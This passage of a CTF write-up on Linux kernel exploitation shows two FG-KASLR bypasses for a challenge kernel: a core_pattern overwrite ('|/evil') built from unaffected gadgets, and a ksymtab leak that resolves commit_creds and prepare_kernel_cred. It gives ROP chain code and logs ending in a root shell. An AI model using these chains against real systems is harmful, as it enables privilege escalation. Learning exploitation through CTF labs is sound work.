+[The tutorial](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/) chooses to implement the first idea. After attempts, the author pointed out that all gadgets from kernel base address to offset `0x400dc6` are not affected by FG-KASLR. Another researcher chooses [the second idea](https://y3a.github.io/2021/06/11/hxpctf-kernelrop/). We will try both!
+
+### 5.1 Bypass FG-KASLR with Unaffected Gadgets
+
+We will build the new exploit based on our coredump exploit from case 3.3.
+
+For this case, we could not find effective gadget of `rdi`, so we choose another `rsi ` related gadget:
+
+``` c
+payload[cookie_off++] = pop_rax_ret + kernel_base_offset;
+payload[cookie_off++] = 0x6c6976652f7c; // rax: |/evil
+payload[cookie_off++] = pop_rsi_pop1_ret + kernel_base_offset;
+payload[cookie_off++] = core_pattern + kernel_base_offset;
+payload[cookie_off++] = 0x0;
+payload[cookie_off++] = write_rax_into_rsi_pop1_ret + kernel_base_offset;
+```
+
+Finally, the whole exploiting process is:
+
+```
+/ $ cat /proc/sys/kernel/core_pattern
+core
+/ $ ./exploit_bypass_fgkaslr_with_unaffected_gadgets
+...
+[*] trying to run ROP chain and bypass FG-KASLR with unaffected gadgets
+Segmentation fault (core dumped)
+/ $ cat /proc/sys/kernel/core_pattern
+|/evil
+/ $ ./trigger
+Segmentation fault (core dumped)
+/ $ /tmp/evilsu
+[*] trying to spawn root shell
+/ # id
+uid=0 gid=0 groups=1000
+```
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_fgkaslr_with_unaffected_gadgets](https://gist.github.com/brant-ruan/4c187b967e2f9ab12dacd718609061d1).
+
+### 5.2 Bypass FG-KASLR by Leaking Kernel Symbol Table
+
+According to [the source code](https://elixir.bootlin.com/linux/v5.16.10/source/include/linux/export.h#L60), each entry in `__ksymtab` is a `kernel_symbol` structure:
+
+``` c
+struct kernel_symbol {
+    int value_offset;
+    int name_offset;
+    int namespace_offset;
+};
+```
+
+So we could firstly leak `__ksymtab_prepare_kernel_cred`, then read `__ksymtab_prepare_kernel_cred->value_offset` to get the real address of `prepare_kernel_cred`. And the way to deal with `commit_creds` is similar.
+
+Firstly, we turn off KASLR and FG-KASLR and obtain addresses of these entries in `__ksymtab`:
+
+```
+/ # cat /proc/kallsyms | grep -E "commit_creds|prepare_kernel_cred"
+ffffffff814c6410 T commit_creds
+ffffffff814c67f0 T prepare_kernel_cred
+ffffffff81f87d90 r __ksymtab_commit_creds
+ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred
+...
+```
+
+Then we could build ROP chain to leak addresses sequentially. The key part is:
+
+``` c
+void leak_prepare_kernel_cred_from_ksymtab() {
+    puts("[*] leaking prepare_kernel_cred address from ksymtab");
+    // ...
+    payload[offset++] = pop_rax_ret + kernel_base_offset;
+    payload[offset++] = ksymtab_prepare_kernel_cred + kernel_base_offset;
+    payload[offset++] = mov_eax_rax_pop1_ret + kernel_base_offset;
+    payload[offset++] = 0;
+    payload[offset++] = swapgs_restore_regs_and_return_to_usermode + kernel_base_offset + 22;
+    payload[offset++] = 0;
+    payload[offset++] = 0;
+    payload[offset++] = (unsigned long)fetch_prepare_kernel_cred;
+    // ...
+}
+
+void fetch_prepare_kernel_cred() {
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov fetch, eax;"
+        ".att_syntax;");
+    prepare_kernel_cred = ksymtab_prepare_kernel_cred + kernel_base_offset + fetch;
+    printf("[+] got prepare_kernel_cred address: 0x%lx\n", prepare_kernel_cred);
+    leak_commit_creds_from_ksymtab();
+}
+
+void leak_commit_creds_from_ksymtab() {
+    puts("[*] leaking commit_creds address from ksymtab");
+    // ...
+    payload[offset++] = pop_rax_ret + kernel_base_offset;
+    payload[offset++] = ksymtab_commit_creds + kernel_base_offset;
+    payload[offset++] = mov_eax_rax_pop1_ret + kernel_base_offset;
+    payload[offset++] = 0;
+    payload[offset++] = swapgs_restore_regs_and_return_to_usermode + kernel_base_offset + 22;
+    payload[offset++] = 0;
+    payload[offset++] = 0;
+    payload[offset++] = (unsigned long)fetch_commit_creds;
+    // ...
+}
+
+void fetch_commit_creds() {
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov fetch, eax;"
+        ".att_syntax;");
+    commit_creds = ksymtab_commit_creds + kernel_base_offset + fetch;
+    printf("[+] got commit_creds address: 0x%lx\n", commit_creds);
+    make_cred();
+}
+
+void make_cred() {
+    puts("[*] invoking prepare_kernel_cred(0)");
+    // ...
+    payload[cookie_off++] = pop_rdi_ret + kernel_base_offset; // return address
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = prepare_kernel_cred;
+    payload[cookie_off++] = swapgs_restore_regs_and_return_to_usermode + kernel_base_offset + 22;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = (unsigned long)fetch_cred;
+    // ...
+}
+
+void fetch_cred(void) {
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov cred_struct_ptr, rax;"
+        ".att_syntax;");
+    printf("[+] got cred struct pointer: 0x%lx\n", cred_struct_ptr);
+    overwrite_ret();
+}
+
+void overwrite_ret() {
+    puts("[*] invoking commit_creds(cred_struct_ptr)");
+    // ...
+    payload[cookie_off++] = pop_rdi_ret + kernel_base_offset; // return address
+    payload[cookie_off++] = cred_struct_ptr;
+    payload[cookie_off++] = commit_creds;
+    payload[cookie_off++] = swapgs_restore_regs_and_return_to_usermode + kernel_base_offset + 22;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = 0x0;
+    payload[cookie_off++] = (unsigned long)spawn_shell;
+    // ...
+}
+```
+
+You can find the whole exploit at [GitHub Gist: exploit_bypass_fgkaslr_with_ksymtab_leak.c](https://gist.github.com/brant-ruan/eb07b3e64f1c70e4fa436dcbb570845a). The whole exploiting process is:
+
+```
+/ $ ./exploit_bypass_fgkaslr_with_ksymtab_leak
+[*] trying to run ROP chain and bypass FG-KASLR with ksymtab leak
+...
+[*] leaking prepare_kernel_cred address from ksymtab
+[+] got prepare_kernel_cred address: 0xffffffff93c95010
+[*] leaking commit_creds address from ksymtab
+[+] got commit_creds address: 0xffffffff93dcf360
+[*] invoking prepare_kernel_cred(0)
+[+] got cred struct pointer: 0xffff9dc6076e1a80
+[*] invoking commit_creds(cred_struct_ptr)
+[+] returned to user land
+[+] got root (uid = 0)
+[*] spawning shell
+/ # id
+uid=0 gid=0
+/ # exit
+```
+
+## Summary
+
+So this is the first post for my kernel PWN experiences. I spent lots of time on doing experiments, writing this post, correcting flaws and modifying paragraphs and sentences. It’s a long time, but really fun.
+
+Actually, there still remain three questions:
+
+1.  What is `commit_creds(prepare_kernel_cred(0))`?
+2.  Why are we not able to overwrite CR4 to bypass SMEP/SMAP anymore?
+3.  What is Stack Pivot? Where can&should we use this technique?
+
+Well, I will keep learning & hacking to answer them. Bye :)
